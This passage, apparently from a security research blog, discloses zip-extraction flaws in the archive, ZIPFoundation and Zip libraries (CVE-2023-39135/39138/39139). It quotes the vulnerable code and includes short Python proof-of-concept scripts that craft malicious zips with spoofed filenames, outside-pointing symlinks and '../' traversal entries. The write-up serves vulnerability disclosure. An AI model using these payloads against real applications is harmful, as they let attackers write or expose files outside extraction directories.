<span class="w">      </span><span class="n">lastModifiedFileTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint16</span><span class="p">();</span>
<span class="w">      </span><span class="n">lastModifiedFileDate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint16</span><span class="p">();</span>
<span class="w">      </span><span class="n">crc32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint32</span><span class="p">();</span>
<span class="w">      </span><span class="n">compressedSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint32</span><span class="p">();</span>
<span class="w">      </span><span class="n">uncompressedSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint32</span><span class="p">();</span>
<span class="w">      </span><span class="kd">final</span><span class="w"> </span><span class="n">fnameLen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint16</span><span class="p">();</span>
<span class="w">      </span><span class="kd">final</span><span class="w"> </span><span class="n">extraLen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint16</span><span class="p">();</span>
<span class="w">      </span><span class="kd">final</span><span class="w"> </span><span class="n">commentLen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint16</span><span class="p">();</span>
<span class="w">      </span><span class="n">diskNumberStart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint16</span><span class="p">();</span>
<span class="w">      </span><span class="n">internalFileAttributes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint16</span><span class="p">();</span>
<span class="w">      </span><span class="n">externalFileAttributes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint32</span><span class="p">();</span>
<span class="w">      </span><span class="n">localHeaderOffset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint32</span><span class="p">();</span>

<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fnameLen</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readString</span><span class="p">(</span><span class="nl">size:</span><span class="w"> </span><span class="n">fnameLen</span><span class="p">);</span>
<span class="w">      </span><span class="p">}</span>
</code></pre></div>
<p>To test this, we crafted a zip file with different filename field values <em>evil.apk</em> and <em>evil.txt</em> respectively for <code>Local File Header</code> and <code>Central Directory Entry</code></p>
<p><strong>Proof of concept code:</strong></p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">zipfile</span>

<span class="k">def</span> <span class="nf">generate_spoofed_zip</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s1">'payload.zip'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
        <span class="n">zipf</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">"Test payload"</span><span class="p">)</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'payload.zip'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
        <span class="n">zip_data</span> <span class="o">=</span> <span class="n">zipf</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">spoofed_data</span> <span class="o">=</span> <span class="n">zip_data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">'utf-8'</span><span class="p">),</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">spoofed_filename</span><span class="p">,</span> <span class="s1">'utf-8'</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'payload.zip'</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
        <span class="n">zipf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">spoofed_data</span><span class="p">)</span>


<span class="n">original_filename</span> <span class="o">=</span> <span class="s1">'evil.txt'</span>
<span class="n">spoofed_filename</span> <span class="o">=</span> <span class="s1">'evil.apk'</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">original_filename</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">len</span><span class="p">(</span><span class="n">spoofed_filename</span><span class="p">):</span>
    <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">"Filenames lengths must be equal"</span><span class="p">)</span>

<span class="n">generate_spoofed_zip</span><span class="p">(</span><span class="n">original_filename</span><span class="p">)</span>
</code></pre></div>
<p><figure><img alt="zip file hexdump" class="img-fluid" src="https://blog.ostorlab.co/static/img/archive_zip/zipfile_hexdump.png" title="Zip file hex dump"/><figcaption style="text-align: center; font-weight: 400; font-style: italic; font-size: 16px; color: #656d76;">Zip file hex dump</figcaption></figure></p>
<p>when we ran <code>zipinfo</code> utility over our zip file, the filename inside was parsed as <code>evil.txt</code></p>
<p><figure><img alt="zipinfo" class="img-fluid" src="https://blog.ostorlab.co/static/img/archive_zip/zipinfo.png" title="zipinfo over our zip file"/><figcaption style="text-align: center; font-weight: 400; font-style: italic; font-size: 16px; color: #656d76;">zipinfo over our zip file</figcaption></figure></p>
<p>However, after extracting the file using <code>extractFileToDisk</code> function from <code>archive</code> package, the filename was parsed as <code>evil.apk</code></p>
<p><figure><img alt="zip file extracted" class="img-fluid" src="https://blog.ostorlab.co/static/img/archive_zip/extracted_zipfile.png" title="Extracted zip file"/><figcaption style="text-align: center; font-weight: 400; font-style: italic; font-size: 16px; color: #656d76;">Extracted zip file</figcaption></figure></p>
<h3 id="zip symlink path traversal (cve-2023-39139)">ZIP symlink path traversal (CVE-2023-39139)</h3>
<p>Another interesting finding we found while inspecting the package was not only it links symlinks back after extraction, it also links ones pointing to any path, even outside the extraction directory.</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">archive</span><span class="p">.</span><span class="n">files</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">final</span><span class="w"> </span><span class="n">filePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">outputPath</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">normalize</span><span class="p">(</span><span class="n">file</span><span class="p">.</span><span class="n">name</span><span class="p">));</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">isWithinOutputPath</span><span class="p">(</span><span class="n">outputPath</span><span class="p">,</span><span class="w"> </span><span class="n">filePath</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">continue</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">file</span><span class="p">.</span><span class="n">isFile</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">file</span><span class="p">.</span><span class="n">isSymbolicLink</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">Directory</span><span class="p">(</span><span class="n">filePath</span><span class="p">).</span><span class="n">createSync</span><span class="p">(</span><span class="nl">recursive:</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
<span class="w">      </span><span class="k">continue</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">asyncWrite</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">file</span><span class="p">.</span><span class="n">isSymbolicLink</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="n">link</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Link</span><span class="p">(</span><span class="n">filePath</span><span class="p">);</span>
<span class="w">        </span><span class="kd">await</span><span class="w"> </span><span class="n">link</span><span class="p">.</span><span class="n">create</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">normalize</span><span class="p">(</span><span class="n">file</span><span class="p">.</span><span class="n">nameOfLinkedFile</span><span class="p">),</span><span class="w"> </span><span class="nl">recursive:</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">filePath</span><span class="p">);</span>
<span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">await</span><span class="w"> </span><span class="n">output</span><span class="p">.</span><span class="n">create</span><span class="p">(</span><span class="nl">recursive:</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
<span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">await</span><span class="w"> </span><span class="n">f</span><span class="p">.</span><span class="n">open</span><span class="p">(</span><span class="nl">mode:</span><span class="w"> </span><span class="n">FileMode</span><span class="p">.</span><span class="n">write</span><span class="p">);</span>
<span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file</span><span class="p">.</span><span class="n">content</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span><span class="p">;</span>
<span class="w">        </span><span class="kd">await</span><span class="w"> </span><span class="n">fp</span><span class="p">.</span><span class="n">writeFrom</span><span class="p">(</span><span class="n">bytes</span><span class="p">);</span>
<span class="w">        </span><span class="n">file</span><span class="p">.</span><span class="n">clear</span><span class="p">();</span>
<span class="w">        </span><span class="n">futures</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">fp</span><span class="p">.</span><span class="n">close</span><span class="p">());</span>
<span class="w">      </span><span class="p">}</span>
</code></pre></div>
<p>To test that we created a symlink <em>evil</em> pointing to a file (<em>secret.txt</em>) in the parent directory, we zipped that symlink using the command <code>zip --symlinks poc.zip evil</code> and extracted <code>poc.zip</code> on an Android test device using <code>extractFileToDisk</code> function.  </p>
<p><strong>Proof of concept code:</strong></p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">zipfile</span>

<span class="k">def</span> <span class="nf">compress_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="n">zipInfo</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipInfo</span><span class="p">(</span><span class="s2">"."</span><span class="p">)</span>
    <span class="n">zipInfo</span><span class="o">.</span><span class="n">create_system</span> <span class="o">=</span> <span class="mi">3</span>
    <span class="n">zipInfo</span><span class="o">.</span><span class="n">external_attr</span> <span class="o">=</span> <span class="mi">2716663808</span>
    <span class="n">zipInfo</span><span class="o">.</span><span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span>

    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s1">'payload.zip'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
        <span class="n">zipf</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">zipInfo</span><span class="p">,</span> <span class="s2">"/etc/hosts"</span><span class="p">)</span>

<span class="n">filename</span> <span class="o">=</span> <span class="s1">'evil'</span>

<span class="n">compress_file</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</code></pre></div>
<p><figure><img alt="symlink workstation" class="img-fluid" src="https://blog.ostorlab.co/static/img/archive_zip/symlink_workstation.png" title="Symlink poc in our workstation"/><figcaption style="text-align: center; font-weight: 400; font-style: italic; font-size: 16px; color: #656d76;">Symlink poc in our workstation</figcaption></figure></p>
<p>Upon extracting the zip file, the symlink was linked back and pointing to <code>../secret.txt</code>, outside the extraction directory.</p>
<p><figure><img alt="symlink android" class="img-fluid" src="https://blog.ostorlab.co/static/img/archive_zip/symlink_android.png" title="Symlink after extraction on android device"/><figcaption style="text-align: center; font-weight: 400; font-style: italic; font-size: 16px; color: #656d76;">Symlink after extraction on android device</figcaption></figure></p>
<h2 id="package: zipfoundation_1">Package: <a href="https://github.com/weichsel/ZIPFoundation">ZIPFoundation</a></h2>
<h3 id="zip symlink path traversal (cve-2023-39138)">ZIP symlink path traversal (CVE-2023-39138)</h3>
<p>Upon extraction, the package passes the path coming from the zip entry directly to <code>fileManager.createSymbolicLink</code> without checking that it is located within extraction directory, we replicated the same test above and found this package too allows symlinks pointing outside the extraction directory.</p>
<div class="highlight"><pre><span></span><code><span class="k">case</span> <span class="p">.</span><span class="n">symlink</span><span class="p">:</span>
    <span class="k">guard</span> <span class="o">!</span><span class="n">fileManager</span><span class="p">.</span><span class="n">itemExists</span><span class="p">(</span><span class="n">at</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="n">CocoaError</span><span class="p">(.</span><span class="n">fileWriteFileExists</span><span class="p">,</span> <span class="n">userInfo</span><span class="p">:</span> <span class="p">[</span><span class="n">NSFilePathErrorKey</span><span class="p">:</span> <span class="n">url</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
    <span class="p">}</span>
    <span class="kd">let</span> <span class="nv">consumer</span> <span class="p">=</span> <span class="p">{</span> <span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="n">Data</span><span class="p">)</span> <span class="k">in</span>
        <span class="k">guard</span> <span class="kd">let</span> <span class="nv">linkPath</span> <span class="p">=</span> <span class="nb">String</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="n">data</span><span class="p">,</span> <span class="n">encoding</span><span class="p">:</span> <span class="p">.</span><span class="n">utf8</span><span class="p">)</span> <span class="k">else</span> <span class="p">{</span> <span class="k">throw</span> <span class="n">ArchiveError</span><span class="p">.</span><span class="n">invalidEntryPath</span> <span class="p">}</span>
        <span class="k">try</span> <span class="n">fileManager</span><span class="p">.</span><span class="n">createParentDirectoryStructure</span><span class="p">(</span><span class="k">for</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span>
        <span class="k">try</span> <span class="n">fileManager</span><span class="p">.</span><span class="n">createSymbolicLink</span><span class="p">(</span><span class="n">atPath</span><span class="p">:</span> <span class="n">url</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">withDestinationPath</span><span class="p">:</span> <span class="n">linkPath</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="n">checksum</span> <span class="p">=</span> <span class="k">try</span> <span class="kc">self</span><span class="p">.</span><span class="n">extract</span><span class="p">(</span><span class="n">entry</span><span class="p">,</span> <span class="n">bufferSize</span><span class="p">:</span> <span class="n">bufferSize</span><span class="p">,</span> <span class="n">skipCRC32</span><span class="p">:</span> <span class="n">skipCRC32</span><span class="p">,</span>
                                <span class="n">progress</span><span class="p">:</span> <span class="n">progress</span><span class="p">,</span> <span class="n">consumer</span><span class="p">:</span> <span class="n">consumer</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="zip path traversal (cve-2023-39138)">ZIP path traversal (CVE-2023-39138)</h3>
<p>the package uses the function <code>isContained</code> to check that the zip entry path is located within the extraction directory:</p>
<div class="highlight"><pre><span></span><code><span class="kd">func</span> <span class="nf">isContained</span><span class="p">(</span><span class="k">in</span> <span class="n">parentDirectoryURL</span><span class="p">:</span> <span class="n">URL</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="nb">Bool</span> <span class="p">{</span>
        <span class="c1">// Ensure this URL is contained in the passed in URL</span>
        <span class="kd">let</span> <span class="nv">parentDirectoryURL</span> <span class="p">=</span> <span class="n">URL</span><span class="p">(</span><span class="n">fileURLWithPath</span><span class="p">:</span> <span class="n">parentDirectoryURL</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">isDirectory</span><span class="p">:</span> <span class="kc">true</span><span class="p">).</span><span class="n">standardized</span>
        <span class="k">return</span> <span class="kc">self</span><span class="p">.</span><span class="n">standardized</span><span class="p">.</span><span class="n">absoluteString</span><span class="p">.</span><span class="n">hasPrefix</span><span class="p">(</span><span class="n">parentDirectoryURL</span><span class="p">.</span><span class="n">absoluteString</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">...</span>
<span class="k">guard</span> <span class="n">entryURL</span><span class="p">.</span><span class="n">isContained</span><span class="p">(</span><span class="k">in</span><span class="p">:</span> <span class="n">destinationURL</span><span class="p">)</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="n">CocoaError</span><span class="p">(.</span><span class="n">fileReadInvalidFileName</span><span class="p">,</span>
                         <span class="n">userInfo</span><span class="p">:</span> <span class="p">[</span><span class="n">NSFilePathErrorKey</span><span class="p">:</span> <span class="n">entryURL</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
    <span class="p">}</span>
<span class="p">...</span>
<span class="n">crc32</span> <span class="p">=</span> <span class="k">try</span> <span class="n">archive</span><span class="p">.</span><span class="n">extract</span><span class="p">(</span><span class="n">entry</span><span class="p">,</span> <span class="n">to</span><span class="p">:</span> <span class="n">entryURL</span><span class="p">,</span> <span class="n">skipCRC32</span><span class="p">:</span> <span class="n">skipCRC32</span><span class="p">,</span> <span class="n">progress</span><span class="p">:</span> <span class="n">entryProgress</span><span class="p">)</span>
</code></pre></div>
<p>Below is a code snippet of the <code>extract</code> function:</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kd">func</span> <span class="nf">extract</span><span class="p">(</span><span class="kc">_</span> <span class="n">entry</span><span class="p">:</span> <span class="n">Entry</span><span class="p">,</span> <span class="n">to</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">,</span> <span class="n">bufferSize</span><span class="p">:</span> <span class="nb">Int</span> <span class="p">=</span> <span class="n">defaultReadChunkSize</span><span class="p">,</span> <span class="n">skipCRC32</span><span class="p">:</span> <span class="nb">Bool</span> <span class="p">=</span> <span class="kc">false</span><span class="p">,</span>
                        <span class="n">progress</span><span class="p">:</span> <span class="n">Progress</span><span class="p">?</span> <span class="p">=</span> <span class="kc">nil</span><span class="p">)</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="n">CRC32</span> <span class="p">{</span>
        <span class="k">guard</span> <span class="n">bufferSize</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="n">ArchiveError</span><span class="p">.</span><span class="n">invalidBufferSize</span>
        <span class="p">}</span>
        <span class="kd">let</span> <span class="nv">fileManager</span> <span class="p">=</span> <span class="n">FileManager</span><span class="p">()</span>
        <span class="kd">var</span> <span class="nv">checksum</span> <span class="p">=</span> <span class="n">CRC32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="k">switch</span> <span class="n">entry</span><span class="p">.</span><span class="n">type</span> <span class="p">{</span>
        <span class="k">case</span> <span class="p">.</span><span class="n">file</span><span class="p">:</span>
            <span class="k">guard</span> <span class="o">!</span><span class="n">fileManager</span><span class="p">.</span><span class="n">itemExists</span><span class="p">(</span><span class="n">at</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span> <span class="k">else</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="n">CocoaError</span><span class="p">(.</span><span class="n">fileWriteFileExists</span><span class="p">,</span> <span class="n">userInfo</span><span class="p">:</span> <span class="p">[</span><span class="n">NSFilePathErrorKey</span><span class="p">:</span> <span class="n">url</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
            <span class="p">}</span>
            <span class="k">try</span> <span class="n">fileManager</span><span class="p">.</span><span class="n">createParentDirectoryStructure</span><span class="p">(</span><span class="k">for</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span>
            <span class="kd">let</span> <span class="nv">destinationRepresentation</span> <span class="p">=</span> <span class="n">fileManager</span><span class="p">.</span><span class="n">fileSystemRepresentation</span><span class="p">(</span><span class="n">withPath</span><span class="p">:</span> <span class="n">url</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
            <span class="k">guard</span> <span class="kd">let</span> <span class="nv">destinationFile</span><span class="p">:</span> <span class="n">FILEPointer</span> <span class="p">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">destinationRepresentation</span><span class="p">,</span> <span class="s">"wb+"</span><span class="p">)</span> <span class="k">else</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="n">POSIXError</span><span class="p">(</span><span class="n">errno</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="n">url</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
            <span class="p">}</span>
            <span class="k">defer</span> <span class="p">{</span> <span class="n">fclose</span><span class="p">(</span><span class="n">destinationFile</span><span class="p">)</span> <span class="p">}</span>
            <span class="kd">let</span> <span class="nv">consumer</span> <span class="p">=</span> <span class="p">{</span> <span class="kc">_</span> <span class="p">=</span> <span class="k">try</span> <span class="n">Data</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">chunk</span><span class="p">:</span> <span class="nv">$0</span><span class="p">,</span> <span class="n">to</span><span class="p">:</span> <span class="n">destinationFile</span><span class="p">)</span> <span class="p">}</span>
            <span class="n">checksum</span> <span class="p">=</span> <span class="k">try</span> <span class="kc">self</span><span class="p">.</span><span class="n">extract</span><span class="p">(</span><span class="n">entry</span><span class="p">,</span> <span class="n">bufferSize</span><span class="p">:</span> <span class="n">bufferSize</span><span class="p">,</span> <span class="n">skipCRC32</span><span class="p">:</span> <span class="n">skipCRC32</span><span class="p">,</span>
                                        <span class="n">progress</span><span class="p">:</span> <span class="n">progress</span><span class="p">,</span> <span class="n">consumer</span><span class="p">:</span> <span class="n">consumer</span><span class="p">)</span>
</code></pre></div>
<p>When provided with the following path <code>/base_path/extraction_directory//../</code> the path gets normalized to <code>/base_path/extraction_directory/entry_file_name</code> which passes the check above.
When that same path is passed to <code>fopen</code>, it gets normalized to <code>/base_path/entry_file_name</code>, allowing us to write files outside the extraction directory.</p>
<p><strong>Proof of concept code:</strong></p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">zipfile</span>

<span class="k">def</span> <span class="nf">compress_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s1">'payload.zip'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
        <span class="n">zipf</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">"Test payload"</span><span class="p">)</span>

<span class="n">filename</span> <span class="o">=</span> <span class="s1">'/../secret.txt'</span>

<span class="n">compress_file</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</code></pre></div>
<h2 id="package: zip_1">Package: <a href="https://github.com/marmelroy/Zip">Zip</a></h2>
<h3 id="zip path traversal (cve-2023-39135)">ZIP path traversal (CVE-2023-39135)</h3>
<p>Below is a code snippet from the <code>unzipFile</code> function used to extract zip files, you can notice that <code>pathString</code> coming from our zip entry is appended to the <code>destination</code> directory without any sanitization</p>
<div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nv">fileNameSize</span> <span class="p">=</span> <span class="nb">Int</span><span class="p">(</span><span class="n">fileInfo</span><span class="p">.</span><span class="n">size_filename</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
<span class="c1">//let fileName = UnsafeMutablePointer&lt;CChar&gt;(allocatingCapacity: fileNameSize)</span>
<span class="kd">let</span> <span class="nv">fileName</span> <span class="p">=</span> <span class="nb">UnsafeMutablePointer</span><span class="p">&lt;</span><span class="nb">CChar</span><span class="p">&gt;.</span><span class="n">allocate</span><span class="p">(</span><span class="n">capacity</span><span class="p">:</span> <span class="n">fileNameSize</span><span class="p">)</span>

<span class="n">unzGetCurrentFileInfo64</span><span class="p">(</span><span class="n">zip</span><span class="p">,</span> <span class="p">&amp;</span><span class="n">fileInfo</span><span class="p">,</span> <span class="n">fileName</span><span class="p">,</span> <span class="nb">UInt</span><span class="p">(</span><span class="n">fileNameSize</span><span class="p">),</span> <span class="kc">nil</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">fileName</span><span class="p">[</span><span class="nb">Int</span><span class="p">(</span><span class="n">fileInfo</span><span class="p">.</span><span class="n">size_filename</span><span class="p">)]</span> <span class="p">=</span> <span class="mi">0</span>

<span class="kd">var</span> <span class="nv">pathString</span> <span class="p">=</span> <span class="nb">String</span><span class="p">(</span><span class="n">cString</span><span class="p">:</span> <span class="n">fileName</span><span class="p">)</span>

<span class="k">guard</span> <span class="n">pathString</span><span class="p">.</span><span class="bp">count</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">throw</span> <span class="n">ZipError</span><span class="p">.</span><span class="n">unzipFail</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nv">isDirectory</span> <span class="p">=</span> <span class="kc">false</span>
<span class="kd">let</span> <span class="nv">fileInfoSizeFileName</span> <span class="p">=</span> <span class="nb">Int</span><span class="p">(</span><span class="n">fileInfo</span><span class="p">.</span><span class="n">size_filename</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="k">if</span> <span class="p">(</span><span class="n">fileName</span><span class="p">[</span><span class="n">fileInfoSizeFileName</span><span class="p">]</span> <span class="p">==</span> <span class="s">"/"</span><span class="p">.</span><span class="n">cString</span><span class="p">(</span><span class="n">using</span><span class="p">:</span> <span class="nb">String</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">utf8</span><span class="p">)?.</span><span class="bp">first</span> <span class="o">||</span> <span class="n">fileName</span><span class="p">[</span><span class="n">fileInfoSizeFileName</span><span class="p">]</span> <span class="p">==</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">.</span><span class="n">cString</span><span class="p">(</span><span class="n">using</span><span class="p">:</span> <span class="nb">String</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">utf8</span><span class="p">)?.</span><span class="bp">first</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">isDirectory</span> <span class="p">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">free</span><span class="p">(</span><span class="n">fileName</span><span class="p">)</span>
<span class="k">if</span> <span class="n">pathString</span><span class="p">.</span><span class="n">rangeOfCharacter</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">CharacterSet</span><span class="p">(</span><span class="n">charactersIn</span><span class="p">:</span> <span class="s">"/</span><span class="se">\\</span><span class="s">"</span><span class="p">))</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
    <span class="n">pathString</span> <span class="p">=</span> <span class="n">pathString</span><span class="p">.</span><span class="n">replacingOccurrences</span><span class="p">(</span><span class="n">of</span><span class="p">:</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="n">with</span><span class="p">:</span> <span class="s">"/"</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nv">fullPath</span> <span class="p">=</span> <span class="n">destination</span><span class="p">.</span><span class="n">appendingPathComponent</span><span class="p">(</span><span class="n">pathString</span><span class="p">).</span><span class="n">path</span>
</code></pre></div>
<p><strong>Proof of concept code:</strong></p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">zipfile</span>

<span class="k">def</span> <span class="nf">compress_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s1">'payload.zip'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
        <span class="n">zipf</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">"Test payload"</span><span class="p">)</span>

<span class="n">filename</span> <span class="o">=</span> <span class="s1">'../secret.txt'</span>

<span class="n">compress_file</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</code></pre></div>
